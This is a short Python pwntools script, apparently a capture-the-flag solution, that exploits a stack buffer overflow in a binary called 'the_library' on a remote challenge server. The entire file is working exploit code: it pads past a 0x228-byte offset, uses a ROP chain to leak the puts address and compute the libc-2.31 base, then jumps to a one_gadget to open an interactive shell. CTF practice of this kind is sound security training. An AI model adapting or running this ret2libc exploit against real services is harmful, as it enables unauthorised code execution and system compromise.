from pwn import *
context.arch = "amd64"

elf = ELF("the_library")
libc = ELF("libc-2.31.so")
rop = ROP("the_library")

script = '''
        break *0x401428
        continue
'''

offset = 0x220 + 8
padding = b""
padding += b"A" * offset

flag = False

if flag:
    p = process("./the_library")
    #gdb.attach(p,script)
else:
    p = remote("challenge.ctf.games",30384)

def leak_libc_base():
    ropchain = flat(
            rop.rdi.address,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
    )

    p.recv()
    p.sendline(padding + ropchain)
    p.recvuntil(b"Wrong :(\n")

    puts = u64(p.recv(6).ljust(8,b"\x00"))
    libc_base = puts - libc.symbols['puts']
    log.info("puts leak : " + hex(puts))
    log.info("libc base address : " + hex(libc_base))

    return libc_base

def one_gadget(libc_base):
    onegadget = libc_base + 0xe6c81
    p.recv()
    p.sendline(padding + p64(onegadget))
    p.interactive()

libc_base = leak_libc_base()
one_gadget(libc_base)